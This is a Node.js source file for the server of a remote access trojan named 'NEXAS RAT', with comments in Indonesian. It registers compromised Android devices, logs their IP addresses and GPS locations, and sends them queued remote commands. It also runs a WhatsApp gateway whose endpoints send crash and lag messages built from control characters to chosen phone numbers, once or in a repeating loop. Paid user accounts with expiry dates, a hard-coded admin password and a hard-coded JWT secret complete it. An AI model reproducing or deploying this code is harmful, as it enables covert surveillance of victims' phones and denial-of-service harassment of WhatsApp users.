const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const cors = require('cors');
const { Client, LocalAuth } = require('whatsapp-web.js');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ========== DATABASE ==========
const db = new sqlite3.Database('./nexas_rat.db');
db.serialize(() => {
    // Tabel devices
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        brand TEXT,
        android_version TEXT,
        ip TEXT,
        country TEXT,
        online INTEGER DEFAULT 0,
        first_seen DATETIME,
        last_seen DATETIME,
        battery INTEGER,
        last_location_lat REAL,
        last_location_lng REAL,
        whatsapp_number TEXT DEFAULT ''
    )`);
    // Tabel commands
    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        action TEXT,
        params TEXT,
        result TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        executed_at DATETIME
    )`);
    // Tabel wa_sessions
    db.run(`CREATE TABLE IF NOT EXISTS wa_sessions (
        id INTEGER PRIMARY KEY,
        session_data TEXT,
        pairing_code TEXT,
        created_at DATETIME
    )`);
    // Tabel users (untuk login dan expiry)
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT DEFAULT 'user',
        expiry_date DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Insert default admin jika belum ada
    db.get(`SELECT * FROM users WHERE username = 'Elene'`, (err, row) => {
        if (!row) {
            bcrypt.hash('Xxelene', 10, (err, hash) => {
                if (!err) {
                    db.run(`INSERT INTO users (username, password, role, expiry_date) VALUES (?, ?, 'admin', NULL)`, ['Elene', hash]);
                }
            });
        }
    });
});

// ========== SOCKET.IO ==========
const clients = new Map(); // deviceId -> socket

io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('register', (deviceInfo) => {
        const { deviceId, name, model, brand, androidVersion, battery, whatsappNumber } = deviceInfo;
        socket.deviceId = deviceId;
        clients.set(deviceId, socket);
        db.run(`INSERT OR REPLACE INTO devices (id, name, model, brand, android_version, ip, online, last_seen, battery, whatsapp_number)
                VALUES (?,?,?,?,?,?,1,CURRENT_TIMESTAMP,?,?)`,
            [deviceId, name, model, brand, androidVersion, socket.handshake.address, battery, whatsappNumber || '']);
        broadcastDevices();
        // Kirim pending commands
        db.all(`SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`, [deviceId], (err, rows) => {
            if (rows) rows.forEach(cmd => {
                socket.emit('command', { id: cmd.id, action: cmd.action, params: JSON.parse(cmd.params || '{}') });
            });
        });
    });

    socket.on('command_result', (data) => {
        const { commandId, result, error } = data;
        db.run(`UPDATE commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?`,
            [JSON.stringify({ result, error }), error ? 'failed' : 'success', commandId]);
        io.emit('command_update', { commandId, result, error, deviceId: socket.deviceId });
    });

    socket.on('update', (update) => {
        if (update.battery) db.run(`UPDATE devices SET battery = ? WHERE id = ?`, [update.battery, socket.deviceId]);
        if (update.location) db.run(`UPDATE devices SET last_location_lat = ?, last_location_lng = ? WHERE id = ?`,
            [update.location.lat, update.location.lng, socket.deviceId]);
        db.run(`UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE id = ?`, [socket.deviceId]);
        broadcastDevices();
    });

    // Event untuk menerima daftar aplikasi dari client
    socket.on('app_list', (data) => {
        socket.broadcast.emit('app_list', data); // kirim ke semua panel (admin)
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            db.run(`UPDATE devices SET online = 0 WHERE id = ?`, [socket.deviceId]);
            clients.delete(socket.deviceId);
            broadcastDevices();
        }
    });
});

function broadcastDevices() {
    db.all(`SELECT * FROM devices ORDER BY online DESC, last_seen DESC`, (err, rows) => {
        if (!err) io.emit('devices', rows);
    });
}

// ========== WHATSAPP GATEWAY ==========
let waClient = null;
let waReady = false;
let pairingCodeRequested = false;

async function initWhatsApp(adminPhone) {
    if (waClient) { try { await waClient.destroy(); } catch(e) {} waClient = null; waReady = false; }
    waClient = new Client({
        authStrategy: new LocalAuth({ clientId: "nexas_pairing" }),
        puppeteer: { headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] }
    });
    waClient.on('qr', (qr) => console.log('QR fallback'));
    waClient.on('authenticated', () => { waReady = true; console.log('✅ WhatsApp authenticated'); });
    waClient.on('auth_failure', (msg) => { console.error('Auth failed:', msg); waReady = false; });
    waClient.on('ready', async () => { waReady = true; pairingCodeRequested = false; });
    waClient.on('disconnected', (reason) => {
        waReady = false;
        setTimeout(() => { if (!waReady) initWhatsApp(adminPhone); }, 10000);
    });
    await waClient.initialize();
    if (adminPhone && !pairingCodeRequested) {
        try {
            const cleanPhone = adminPhone.replace(/\D/g, '');
            const code = await waClient.requestPairingCode(cleanPhone);
            pairingCodeRequested = true;
            db.run(`INSERT OR REPLACE INTO wa_sessions (id, pairing_code, created_at) VALUES (1, ?, CURRENT_TIMESTAMP)`, [code]);
            io.emit('wa_pairing_code', { code, phone: cleanPhone });
        } catch (err) { console.error('Pairing error:', err); }
    }
}

// ========== WHATSAPP BUG EXPLOITS ==========
const activeExploits = new Map();

async function sendMaliciousMessage(chatId, type) {
    let message = '';
    switch(type) {
        case 'force_invisible': message = '\u200E\u202E\u200F\u0000' + '‮'.repeat(2000) + '￼'.repeat(1000); break;
        case 'force_hard': message = '␀'.repeat(5000) + '💀'.repeat(3000); break;
        case 'delay_invisible': message = '‌'.repeat(10000); break;
        case 'delay_hard': message = 'a'.repeat(20000) + '‍'.repeat(15000); break;
        case 'onehit': message = '‪‪‪‪‪‪‪'.repeat(5000) + '\u061C'.repeat(2000); break;
        default: return null;
    }
    return waClient.sendMessage(chatId, message);
}

app.post('/api/wa_exploit_start', (req, res) => {
    const { targetNumber, exploitType, intervalMs = 2000 } = req.body;
    if (!waClient || !waReady) return res.status(503).json({ error: 'WhatsApp gateway tidak aktif' });
    let formatted = targetNumber.replace(/\D/g, '').replace(/^0/, '62');
    if (!formatted.startsWith('62')) formatted = '62' + formatted;
    const chatId = `${formatted}@c.us`;
    if (activeExploits.has(formatted)) clearInterval(activeExploits.get(formatted).intervalId);
    if (['delay_invisible', 'delay_hard', 'onehit'].includes(exploitType)) {
        sendMaliciousMessage(chatId, exploitType).catch(e => console.error(e));
        return res.json({ success: true, message: `Exploit ${exploitType} (sekali) terkirim` });
    }
    const intervalId = setInterval(async () => { try { await sendMaliciousMessage(chatId, exploitType); } catch(e) {} }, intervalMs);
    activeExploits.set(formatted, { type: exploitType, intervalId });
    res.json({ success: true, message: `Exploit ${exploitType} loop dimulai (interval ${intervalMs}ms)` });
});

app.post('/api/wa_exploit_stop', (req, res) => {
    const { targetNumber } = req.body;
    let formatted = targetNumber.replace(/\D/g, '').replace(/^0/, '62');
    if (!formatted.startsWith('62')) formatted = '62' + formatted;
    if (activeExploits.has(formatted)) {
        clearInterval(activeExploits.get(formatted).intervalId);
        activeExploits.delete(formatted);
        res.json({ success: true, message: `Exploit untuk ${formatted} dihentikan` });
    } else res.json({ success: false, message: `Tidak ada exploit aktif untuk ${formatted}` });
});

app.get('/api/wa_exploit_status', (req, res) => {
    const status = {};
    for (let [target, data] of activeExploits.entries()) status[target] = { type: data.type, running: true };
    res.json(status);
});

app.post('/api/send_whatsapp_command', (req, res) => {
    const { targetNumber, command, params } = req.body;
    if (!waClient || !waReady) return res.status(503).json({ error: 'WhatsApp gateway tidak aktif' });
    let formatted = targetNumber.replace(/\D/g, '').replace(/^0/, '62');
    if (!formatted.startsWith('62')) formatted = '62' + formatted;
    const chatId = `${formatted}@c.us`;
    let msg = (command === 'text') ? params : `/${command}` + (params ? ' ' + (typeof params === 'object' ? JSON.stringify(params) : params) : '');
    waClient.sendMessage(chatId, msg).then(() => res.json({ success: true })).catch(err => res.status(500).json({ error: err.message }));
});

app.post('/api/wa_start_pairing', (req, res) => {
    const { adminPhone } = req.body;
    if (!adminPhone) return res.status(400).json({ error: 'Nomor admin diperlukan' });
    initWhatsApp(adminPhone).catch(e => res.status(500).json({ error: e.message }));
    res.json({ success: true, message: 'Meminta pairing code...' });
});

app.get('/api/wa_status', (req, res) => { res.json({ ready: waReady }); });

// ========== API AUTHENTICATION & USER MANAGEMENT ==========
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    db.get(`SELECT * FROM users WHERE username = ?`, [username], async (err, user) => {
        if (err || !user) return res.status(401).json({ error: 'Invalid credentials' });
        const match = await bcrypt.compare(password, user.password);
        if (!match) return res.status(401).json({ error: 'Invalid credentials' });
        // Cek expiry untuk role user
        if (user.role !== 'admin' && user.expiry_date) {
            const now = new Date();
            const expiry = new Date(user.expiry_date);
            if (now > expiry) {
                return res.status(401).json({ error: 'Akun sudah expired. Hubungi owner.' });
            }
        }
        const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, 'nexas_s3cr3t_k3y', { expiresIn: '24h' });
        res.json({ token, role: user.role });
    });
});

// Middleware autentikasi
function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    try {
        const decoded = jwt.verify(token, 'nexas_s3cr3t_k3y');
        req.user = decoded;
        next();
    } catch(e) {
        res.status(401).json({ error: 'Invalid token' });
    }
}

app.post('/api/create_user', authenticate, (req, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: 'Only admin can create users' });
    const { username, password, durationDays } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    const expiryDate = durationDays ? new Date(Date.now() + durationDays * 24 * 60 * 60 * 1000) : null;
    bcrypt.hash(password, 10, (err, hash) => {
        if (err) return res.status(500).json({ error: 'Hash error' });
        db.run(`INSERT INTO users (username, password, role, expiry_date) VALUES (?, ?, 'user', ?)`, [username, hash, expiryDate], function(err) {
            if (err) return res.status(500).json({ error: 'Username exists' });
            res.json({ success: true, message: `User ${username} created, expiry: ${expiryDate || 'never'}` });
        });
    });
});

app.get('/api/list_users', authenticate, (req, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
    db.all(`SELECT id, username, role, expiry_date, created_at FROM users`, (err, rows) => {
        res.json(rows || []);
    });
});

app.post('/api/delete_user', authenticate, (req, res) => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });
    const { userId } = req.body;
    if (req.user.id === userId) return res.status(400).json({ error: 'Cannot delete yourself' });
    db.run(`DELETE FROM users WHERE id = ?`, [userId], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// ========== API RAT ==========
app.post('/api/send_command', authenticate, (req, res) => {
    const { deviceId, action, params } = req.body;
    const clientSocket = clients.get(deviceId);
    if (!clientSocket) {
        db.run(`INSERT INTO commands (device_id, action, params, status) VALUES (?,?,?,'pending')`,
            [deviceId, action, JSON.stringify(params)], function(err) {
                if (err) return res.status(500).json({ error: err.message });
                res.json({ commandId: this.lastID, status: 'queued' });
            });
    } else {
        db.run(`INSERT INTO commands (device_id, action, params, status) VALUES (?,?,?,'sent')`,
            [deviceId, action, JSON.stringify(params)], function(err) {
                if (err) return res.status(500).json({ error: err.message });
                clientSocket.emit('command', { id: this.lastID, action, params });
                res.json({ commandId: this.lastID, status: 'sent' });
            });
    }
});

app.get('/api/devices', authenticate, (req, res) => {
    db.all(`SELECT * FROM devices`, (err, rows) => {
        res.json(rows || []);
    });
});

app.post('/api/update_device_phone', authenticate, (req, res) => {
    const { deviceId, whatsappNumber } = req.body;
    db.run(`UPDATE devices SET whatsapp_number = ? WHERE id = ?`, [whatsappNumber, deviceId], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🩸 NEXAS RAT SERVER berjalan di port ${PORT}`);
    console.log(`Panel: http://localhost:${PORT}/panel.html`);
});